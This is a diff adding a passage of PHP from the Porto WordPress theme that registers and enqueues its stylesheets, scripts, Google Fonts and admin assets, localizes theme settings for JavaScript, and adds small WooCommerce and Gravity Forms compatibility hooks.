+    wp_dequeue_style( 'bsf-Simple-Line-Icons' );
+
+    global $porto_settings;
+
+    if ( class_exists( 'RevSlider' ) && isset( $porto_settings['speed-optimize-revslider'] ) && $porto_settings['speed-optimize-revslider'] && isset( $porto_settings['speed-optimize-revslider-page'] ) && !empty( $porto_settings['speed-optimize-revslider-page'] ) ) {
+        $rev_pages = $porto_settings['speed-optimize-revslider-page'];
+        $use_revslider = false;
+        global $post;
+        foreach( $rev_pages as $page ) {
+            if ( is_page() && ( $post->ID == $page ) ) {
+                $use_revslider = true;
+                break;
+            }
+        }
+        if ( !$use_revslider ) {
+            wp_dequeue_style( 'rs-plugin-settings' );
+            wp_dequeue_script( 'tp-tools' );
+            wp_dequeue_script( 'revmin' );
+        }
+    }
+
+    // woocommerce single product layout
+    if ( is_singular( 'product' ) ) {
+        global $porto_product_layout;
+        $porto_product_layout = get_post_meta(get_the_ID(), 'product_layout', true);
+        $porto_product_layout = ( !$porto_product_layout && isset( $porto_settings['product-single-content-layout'] ) ) ? $porto_settings['product-single-content-layout'] : $porto_product_layout;
+        if ( !$porto_product_layout ) {
+            $porto_product_layout = 'default';
+        }
+    }
+
+    // load visual composer styles
+    if ( defined( 'WPB_VC_VERSION' ) && isset( $porto_settings['speed-optimize-js-composer'] ) && $porto_settings['speed-optimize-js-composer'] && file_exists( vc_path_dir('ASSETS_DIR') . '/css/js_composer.optimized.min.css' ) ) {
+        wp_deregister_style( 'js_composer_front' );
+        wp_dequeue_style( 'js_composer_front' );
+        wp_register_style( 'js_composer_front', vc_asset_url( 'css/js_composer.optimized.min.css' ), array(), WPB_VC_VERSION );
+    }
+    if ( !wp_style_is( 'js_composer_front' ) ) {
+        wp_enqueue_style( 'js_composer_front' );
+    }
+    // load ultimate addons default js
+    $bsf_options = get_option( 'bsf_options' );
+    $ultimate_global_scripts = ( isset( $bsf_options['ultimate_global_scripts'] ) ) ? $bsf_options['ultimate_global_scripts'] : false;
+    if ( $ultimate_global_scripts !== 'enable' ) {
+        $ultimate_css = get_option( 'ultimate_css' );
+        if ( $ultimate_css == "enable" ) {
+            if ( !wp_style_is( 'ultimate-style-min' ) )
+                wp_enqueue_style( 'ultimate-style-min' );
+        } else {
+            if ( !wp_style_is( 'ultimate-style' ) ) {
+                wp_enqueue_style( 'ultimate-style' );
+            }
+        }
+    }
+
+    /* register styles */
+    // bootstrap styles
+    wp_deregister_style( 'porto-bootstrap' );
+    if ( is_rtl() ) {
+        porto_register_style( 'porto-bootstrap', 'bootstrap_rtl');
+    } else {
+        porto_register_style( 'porto-bootstrap', 'bootstrap');
+    }
+
+    // plugins styles
+    wp_deregister_style( 'porto-plugins' );
+    if ( is_rtl() ) {
+        wp_register_style( 'porto-plugins', porto_uri.'/css/plugins_rtl.css?ver=' . porto_version );
+    } else {
+        wp_register_style( 'porto-plugins', porto_uri.'/css/plugins.css?ver=' . porto_version );
+    }
+
+    // default styles
+    wp_deregister_style( 'porto-theme' );
+    if ( is_rtl() ) {
+        wp_register_style( 'porto-theme', porto_uri.'/css/theme_rtl.css?ver=' . porto_version );
+    } else {
+        wp_register_style( 'porto-theme', porto_uri.'/css/theme.css?ver=' . porto_version );
+    }
+
+    // woocommerce styles
+    if ( class_exists( 'WooCommerce' ) ) {
+        wp_deregister_style( 'porto-theme-shop' );
+        if ( is_rtl() ) {
+            wp_register_style( 'porto-theme-shop', porto_uri.'/css/theme_rtl_shop.css?ver=' . porto_version );
+        } else {
+            wp_register_style( 'porto-theme-shop', porto_uri.'/css/theme_shop.css?ver=' . porto_version );
+        }
+    }
+
+    // bbpress, buddypress styles
+    if ( class_exists( 'bbPress' ) || class_exists( 'BuddyPress' ) ) {
+        wp_deregister_style( 'porto-theme-bbpress' );
+        if ( is_rtl() ) {
+            wp_register_style( 'porto-theme-bbpress', porto_uri.'/css/theme_rtl_bbpress.css?ver=' . porto_version );
+        } else {
+            wp_register_style( 'porto-theme-bbpress', porto_uri.'/css/theme_bbpress.css?ver=' . porto_version );
+        }
+    }
+
+    // dynamic styles
+    wp_deregister_style( 'porto-dynamic-style' );
+    if ( is_rtl() ) {
+        porto_register_style( 'porto-dynamic-style', 'dynamic_style_rtl');
+    } else {
+        porto_register_style( 'porto-dynamic-style', 'dynamic_style');
+    }
+
+    // skin styles
+    wp_deregister_style( 'porto-skin' );
+    if ( is_rtl() ) {
+        porto_register_style( 'porto-skin', 'skin_rtl');
+    } else {
+        porto_register_style( 'porto-skin', 'skin');
+    }
+
+    // custom styles
+    wp_deregister_style( 'porto-style' );
+    wp_register_style( 'porto-style', porto_uri . '/style.css' );
+    if ( is_rtl() ) {
+        wp_deregister_style( 'porto-style-rtl' );
+        wp_register_style( 'porto-style-rtl', porto_uri . '/style_rtl.css' );
+    }
+
+    // Load Google Fonts
+    $gfont = array();
+    $gfont_weight = array( 200, 300, 400, 700, 800 );
+    $fonts = array( 'body', 'alt', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'paragraph', 'footer', 'footer-heading', 'menu', 'menu-side', 'menu-popup', 'add-to-cart', 'custom1', 'custom2', 'custom3' );
+    foreach ( $fonts as $option ) {
+        if ( isset( $porto_settings[$option.'-font']['google'] ) && $porto_settings[$option.'-font']['google'] !== 'false' ) {
+            $font = isset( $porto_settings[$option.'-font']['font-family'] ) ? urlencode( $porto_settings[$option.'-font']['font-family'] ) : '';
+            $font_weight = isset( $porto_settings[$option.'-font']['font-weight'] ) ? $porto_settings[$option.'-font']['font-weight'] : '';
+            if ( $font && !in_array( $font, $gfont ) ) {
+                $gfont[] = $font;
+            }
+            if ( $font_weight && !in_array( $font_weight, $gfont_weight ) ) {
+                $gfont_weight[] = $font_weight;
+            }
+        }
+    }
+    $gfont_weight = implode( ',', $gfont_weight );
+    $font_family = '';
+    $font_family_arr = array();
+    foreach ( $gfont as $font ) {
+        $font_family_arr[] = str_replace( ' ', '+', $font ) . ':' . $gfont_weight;
+    }
+    if ( !empty( $font_family_arr ) ) {
+        $font_family = implode( '|', $font_family_arr );
+    }
+    if ( $font_family ) {
+        $charsets = array();
+        if ( isset( $porto_settings['select-google-charset'] ) && $porto_settings['select-google-charset'] && isset( $porto_settings['google-charsets'] ) && $porto_settings['google-charsets'] ) {
+            $i = 0;
+            foreach ( $porto_settings['google-charsets'] as $charset ) {
+                if ( $charset && !in_array( $charset, $charsets ) ) {
+                    $charsets[] = $charset;
+                }
+            }
+        }
+
+        $custom_font_args = array(
+            'family' => $font_family
+        );
+        if ( !empty( $charsets ) ) {
+            $custom_font_args['subset'] = implode( ',', $charsets );
+        }
+
+        $google_font_url = add_query_arg( $custom_font_args, '//fonts.googleapis.com/css' );
+        wp_register_style( 'porto-google-fonts', $google_font_url );
+    }
+
+    // ie styles
+    global $wp_styles;
+    wp_deregister_style( 'porto-ie' );
+    wp_register_style( 'porto-ie', porto_uri.'/css/ie.css?ver=' . porto_version );
+
+    /* enqueue styles */
+    wp_enqueue_style( 'porto-bootstrap' );
+    wp_enqueue_style( 'porto-plugins' );
+    wp_enqueue_style( 'porto-google-fonts' );
+    wp_enqueue_style( 'porto-theme' );
+    if ( class_exists( 'WooCommerce' ) ) {
+        wp_enqueue_style( 'porto-theme-shop' );
+    }
+    if ( class_exists( 'bbPress' ) || class_exists( 'BuddyPress' ) ) {
+        wp_enqueue_style( 'porto-theme-bbpress' );
+    }
+    wp_enqueue_style( 'porto-dynamic-style' );
+    wp_enqueue_style( 'porto-skin' );
+    wp_enqueue_style( 'porto-style' );
+    if ( is_rtl() ) {
+        wp_enqueue_style( 'porto-style-rtl' );
+    }
+
+    wp_enqueue_style( 'porto-ie' );
+    $wp_styles->add_data( 'porto-ie', 'conditional', 'lt IE 10' );
+    if ( current_user_can( 'edit_theme_options' ) ) {
+        // admin style
+        wp_enqueue_style( 'porto_admin_bar', porto_css . '/admin_bar.css', false, porto_version, 'all' );
+    }
+    porto_enqueue_revslider_css();
+}
+function porto_register_style( $handle, $filename ) {
+    global $wp_filesystem;
+    $blog_id = porto_get_blog_id();
+    $css_file = porto_dir.'/css/'.$filename.'_'.$blog_id.'.css';
+    if ( file_exists( $css_file ) ) {
+        wp_register_style( $handle, porto_uri.'/css/'.$filename.'_'.$blog_id.'.css?ver=' . porto_version );
+    } else {
+        wp_register_style( $handle, porto_uri.'/css/'.$filename.'.css?ver=' . porto_version );
+    }
+}
+function porto_scripts() {
+    global $porto_settings;
+    if (!is_admin() && !in_array( $GLOBALS['pagenow'], array( 'wp-login.php', 'wp-register.php' ) )) {
+        wp_reset_postdata();
+
+        // comment reply
+        if ( is_singular() && get_option( 'thread_comments' ) ) {
+            wp_enqueue_script( 'comment-reply' );
+        }
+        // load wc variation script
+        wp_enqueue_script( 'wc-add-to-cart-variation' );
+        // load visual composer default js
+        if (!wp_script_is('wpb_composer_front_js')) {
+            wp_enqueue_script('wpb_composer_front_js');
+        }
+        // load ultimate addons default js
+        $bsf_options = get_option('bsf_options');
+        $ultimate_global_scripts = (isset($bsf_options['ultimate_global_scripts'])) ? $bsf_options['ultimate_global_scripts'] : false;
+        if ($ultimate_global_scripts !== 'enable') {
+            $isAjax = false;
+            $ultimate_ajax_theme = get_option('ultimate_ajax_theme');
+            if ($ultimate_ajax_theme == 'enable')
+                $isAjax = true;
+            $ultimate_js = get_option('ultimate_js', 'disable');
+            $bsf_dev_mode = (isset($bsf_options['dev_mode'])) ? $bsf_options['dev_mode'] : false;
+            if (($ultimate_js == 'enable' || $isAjax == true) && ($bsf_dev_mode != 'enable') ) {
+                if (!wp_script_is('ultimate-script')) {
+                    wp_enqueue_script('ultimate-script');
+                }
+            }
+        }
+        // porto scripts
+        wp_deregister_script( 'porto-plugins-popper' );
+        wp_register_script( 'porto-plugins-popper', porto_js .'/popper'.(WP_DEBUG?'':'.min').'.js', array('jquery', 'jquery-migrate'), porto_version, false );
+        wp_enqueue_script( 'porto-plugins-popper' );
+
+        $optimize_suffix = '';
+        if ( isset( $porto_settings['speed-optimize-bootstrap'] ) && $porto_settings['speed-optimize-bootstrap'] ) {
+            $optimize_suffix = '.optimized';
+        }
+        wp_deregister_script( 'porto-bootstrap' );
+        wp_register_script( 'porto-bootstrap', porto_js .'/bootstrap'. $optimize_suffix .(WP_DEBUG?'':'.min').'.js', array('porto-plugins-popper'), porto_version, false );
+        wp_enqueue_script( 'porto-bootstrap' );
+
+        wp_deregister_script( 'porto-plugins' );
+        wp_register_script( 'porto-plugins', porto_js .'/plugins'.(WP_DEBUG?'':'.min').'.js', array('porto-bootstrap'), porto_version, false );
+        wp_enqueue_script( 'porto-plugins' );
+        // load porto theme js file
+        wp_deregister_script( 'porto-theme' );
+        wp_register_script( 'porto-theme', porto_js .'/theme'.(WP_DEBUG?'':'.min').'.js', array('jquery'), porto_version, true );
+        wp_enqueue_script( 'porto-theme' );
+        // compatible check with product filter plugin
+        $js_wc_prdctfltr = false;
+        if (class_exists('WC_Prdctfltr')) {
+            $porto_settings['category-ajax'] = false;
+            if ( get_option( 'wc_settings_prdctfltr_use_ajax', 'no' ) == 'yes' ) {
+                $js_wc_prdctfltr = true;
+            }
+        }
+        $sticky_header = porto_get_meta_value('sticky_header');
+        $show_sticky_header = false;
+        if ('no' !== $sticky_header && ('yes' === $sticky_header || ('yes' !== $sticky_header && $porto_settings['enable-sticky-header']))) {
+            $show_sticky_header = true;
+        }
+
+        global $porto_product_layout;
+        wp_localize_script( 'porto-theme', 'js_porto_vars', array(
+            'rtl' => esc_js(is_rtl() ? true : false),
+            'ajax_url' => esc_js(admin_url( 'admin-ajax.php' )),
+            'change_logo' => esc_js($porto_settings['change-header-logo']),
+            'container_width' => esc_js($porto_settings['container-width']),
+            'grid_gutter_width' => esc_js($porto_settings['grid-gutter-width']),
+            'show_sticky_header' => esc_js($show_sticky_header),
+            'show_sticky_header_tablet' => esc_js($porto_settings['enable-sticky-header-tablet']),
+            'show_sticky_header_mobile' => esc_js($porto_settings['enable-sticky-header-mobile']),
+            'ajax_loader_url' => esc_js(str_replace(array('http:', 'https'), array('', ''), porto_uri . '/images/ajax-loader@2x.gif')),
+            'category_ajax' => esc_js($porto_settings['category-ajax']),
+            'prdctfltr_ajax' => esc_js($js_wc_prdctfltr),
+            'show_minicart' => esc_js($porto_settings['show-minicart']),
+            'slider_loop' => esc_js($porto_settings['slider-loop']),
+            'slider_autoplay' => esc_js($porto_settings['slider-autoplay']),
+            'slider_autoheight' => esc_js($porto_settings['slider-autoheight']),
+            'slider_speed' => esc_js($porto_settings['slider-speed']),
+            'slider_nav' => esc_js($porto_settings['slider-nav']),
+            'slider_nav_hover' => esc_js($porto_settings['slider-nav-hover']),
+            'slider_margin' => esc_js($porto_settings['slider-margin']),
+            'slider_dots' => esc_js($porto_settings['slider-dots']),
+            'slider_animatein' => esc_js($porto_settings['slider-animatein']),
+            'slider_animateout' => esc_js($porto_settings['slider-animateout']),
+            'product_thumbs_count' => esc_js($porto_settings['product-thumbs-count']),
+            'product_zoom' => isset( $porto_product_layout ) && ( 'extended' === $porto_product_layout || 'full_width' === $porto_product_layout ) ? 0 : esc_js($porto_settings['product-zoom']),
+            'product_zoom_mobile' => esc_js($porto_settings['product-zoom-mobile']),
+            'product_image_popup' => esc_js($porto_settings['product-image-popup']),
+            'zoom_type' => esc_js($porto_settings['zoom-type']),
+            'zoom_scroll' => esc_js($porto_settings['zoom-scroll']),
+            'zoom_lens_size' => esc_js($porto_settings['zoom-lens-size']),
+            'zoom_lens_shape' => esc_js($porto_settings['zoom-lens-shape']),
+            'zoom_contain_lens' => esc_js($porto_settings['zoom-contain-lens']),
+            'zoom_lens_border' => esc_js($porto_settings['zoom-lens-border']),
+            'zoom_border_color' => esc_js($porto_settings['zoom-border-color']),
+            'zoom_border' => esc_js($porto_settings['zoom-type'] == 'inner' ? 0 : $porto_settings['zoom-border']),
+            'screen_lg' => esc_js($porto_settings['container-width'] + $porto_settings['grid-gutter-width']),
+            'mfp_counter' => esc_js(__('%curr% of %total%', 'porto')),
+            'mfp_img_error' => esc_js(__('<a href="%url%">The image</a> could not be loaded.', 'porto')),
+            'mfp_ajax_error' => esc_js(__('<a href="%url%">The content</a> could not be loaded.', 'porto')),
+            'popup_close' => esc_js(__('Close', 'porto')),
+            'popup_prev' => esc_js(__('Previous', 'porto')),
+            'popup_next' => esc_js(__('Next', 'porto')),
+            'request_error' => esc_js(__('The requested content cannot be loaded.<br/>Please try again later.', 'porto'))
+        ) );
+    }
+}
+function porto_admin_css() {
+    //porto icon font
+    wp_enqueue_style('porto-font', porto_css . '/Porto-Font/Porto-Font.css', false, porto_version, 'all');
+    // simple line icon font
+    wp_dequeue_style( 'bsf-Simple-Line-Icons' );
+    wp_dequeue_style( 'porto_shortcodes_simpleline' );
+    wp_enqueue_style('porto-sli-font', porto_css . '/Simple-Line-Icons/Simple-Line-Icons.css', false, porto_version, 'all');
+    // wp default styles
+    wp_enqueue_style( 'wp-color-picker' );
+    // codemirror
+    wp_enqueue_style('porto_codemirror', porto_css . '/codemirror.css', false, porto_version, 'all');
+    // admin style
+    wp_enqueue_style('porto_admin', porto_css . '/admin.css', false, porto_version, 'all');
+    wp_enqueue_style('porto_admin_bar', porto_css . '/admin_bar.css', false, porto_version, 'all');
+    porto_enqueue_revslider_css();
+
+    global $pagenow;
+    if ($pagenow == 'admin.php' && isset($_GET['page']) && 'porto-demos' === $_GET['page']) {
+        wp_enqueue_style('porto_magnific_popup', porto_css.'/magnific-popup.min.css', false, porto_version, 'all');
+    }
+}
+function porto_admin_scripts() {
+    if (function_exists('add_thickbox'))
+        add_thickbox();
+    wp_enqueue_media();
+    global $pagenow;
+    if (in_array($pagenow, array('post.php', 'post-new.php', 'term.php'))) {
+        // codemirror
+        wp_register_script('porto-codemirror', porto_js.'/codemirror.js', array('jquery'), porto_version, true);
+        wp_enqueue_script('porto-codemirror');
+        wp_register_script('porto-codemirror-css', porto_js.'/codemirror/css.js', array('porto-codemirror'), porto_version, true);
+        wp_enqueue_script('porto-codemirror-css');
+        wp_register_script('porto-codemirror-js', porto_js.'/codemirror/javascript.js', array('porto-codemirror'), porto_version, true);
+        wp_enqueue_script('porto-codemirror-js');
+    }
+    if ($pagenow == 'admin.php' && isset($_GET['page']) && 'porto-demos' === $_GET['page']) {
+        wp_register_script('porto-magnific-popup', porto_js.'/jquery.magnific-popup.min.js', array('jquery'), porto_version, true);
+        wp_enqueue_script('porto-magnific-popup');
+    }
+    // admin script
+    wp_register_script('porto-admin', porto_js.'/admin.js', array('common', 'jquery', 'media-upload', 'thickbox', 'wp-color-picker'), porto_version, true);
+    wp_enqueue_script('porto-admin');
+    wp_localize_script( 'porto-admin', 'js_porto_admin_vars', array(
+        'import_options_msg' => __('If you want to import demo, please backup current theme options in "Import / Export" section before import. Do you want to import demo?', 'porto'),
+        'theme_option_url' => admin_url('admin.php?page=porto_settings')
+    ) );
+}
+// Disable the WordPress Admin Bar for all but admins
+if (! current_user_can('edit_posts')):
+    show_admin_bar(false);
+endif;
+function porto_footer_hook() {
+    add_filter('style_loader_tag', 'porto_style_loader_tag');
+}
+function porto_style_loader_tag($tag) {
+    return str_replace("rel='stylesheet'", "rel='stylesheet' property='stylesheet'", $tag);
+}
+function porto_enqueue_revslider_css() {
+    global $porto_settings;
+    $style = '';
+    if ($porto_settings['skin-color']) {
+        $style = '.tparrows:before{color:' . $porto_settings['skin-color'] . ';text-shadow:0 0 3px #fff;}';
+    }
+    $style .= '.revslider-initialised .tp-loader{z-index:18;}';
+    wp_add_inline_style('rs-plugin-settings', $style);
+}
+// retrieves the attachment ID from the file URL
+function porto_get_image_id($image_url) {
+    global $wpdb;
+    $attachment = $wpdb->get_col($wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE guid='%s';", $image_url ));
+    if ( isset( $attachment[0] ) ) {
+        return $attachment[0]; 
+    } else {
+        return false;
+    }
+}
+// gravityform notifications
+add_filter( 'gform_validation_message', 'porto_gform_validation_message', 10, 2 );
+function porto_gform_validation_message( $message, $form ) {
+    return '<div class="alert alert-danger br-normal"><strong>'.strip_tags($message).'</strong></div>';
+}
+add_filter( 'gform_confirmation', 'porto_gform_confirmation', 10, 4 );
+function porto_gform_confirmation( $confirmation, $form, $entry, $ajax ) {
+    return '<div class="alert alert-success br-normal">'.strip_tags($confirmation).'</div>';
+}
+
+// Fix for PHP Fatal error:  Call to undefined function YIT_Pointers() in \plugins\yith-woocommerce-wishlist\includes\class.yith-wcwl-admin-init.php
+if ( ! function_exists( 'is_plugin_activate' )){
+    require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
+}
+if( is_plugin_active('yith-woocommerce-wishlist/init.php') ){
+    if( ! class_exists( 'YIT_Pointers' ) ){
+        require_once( get_template_directory() . '/woocommerce/yit-pointers.php' );
+    }
+}
